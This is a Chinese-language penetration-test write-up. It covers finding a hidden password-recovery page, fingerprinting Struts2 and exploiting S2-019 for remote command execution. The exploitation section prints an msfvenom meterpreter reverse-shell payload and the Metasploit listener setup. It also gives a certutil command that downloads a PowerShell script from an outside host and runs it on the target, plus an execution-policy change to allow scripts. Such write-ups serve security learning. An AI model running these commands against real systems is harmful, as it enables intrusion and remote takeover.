前言


    在某次渗透测试的过程中，通过端口扫描发现目标开放了8089端口的web服务。访问该端口发现是该单位某个系统后台，然而发现它的验证码是刷新不出来的。本来一般情况下是可以放弃这个系统测试了，因为登陆时后端会对用户输入的验证码进行相关校验。但是一句话是这样讲的:"没挖到洞一定是自己不够细心。"然后有了下面的越权访问getshell。



01

—

越权访问


访问目标：http：//xx.xx.xx.xx:8089/login.jsp


通过F12查看相关JS信息和接口，发现有处xxxPassword.action

访问xxxPassword.action页面，发现是后台的一处密码找回功能。



02

—


框架识别


看到.action后缀得先判断网站所使用的框架是S2还是Spring Boot。在Struts2中，追加actionErrors参数会引起报错且出现报错页面。在Spring中支持 / 匹配，比如说/test.action和/test.action/的显示结果是一致。因为开发者有可能会隐藏S2的报错页面，所以结合两者能够大概分析出网站所使用的框架技术，这样我们才更好的“对症下药”。


因此尝试在路径后面添加错误参数actionErrors，发现成功报错，那么可以肯定网站使用的是S2框架。



03

—


漏洞利用


一做二不休，直接使用S2检测工具对其进行漏洞检测，发现存在漏洞S2-019并成功执行命令：

通过RCE我们可以选择上传webshell或者powershell反弹脚本进行下一步渗透。


比如说基于MSF的powershell反弹，利用msfvenom生成powershell脚本：

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.30.128 LPORT=5555 -f psh-reflection >5555.ps1

msf开启监听：

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.30.128
lhost => 192.168.30.128
msf5 exploit(multi/handler) > set lport 5555

 在目标主机执行：

certutil.exe -urlcache -split -f http://35.160.49.136:17922/5555.ps1 5555.ps1 | ./5555.ps1

如果禁用脚本，那么在目标机子上以管理员身份运行powershell，然后执行set-ExecutionPolicy RemoteSigned，选择Y即可。
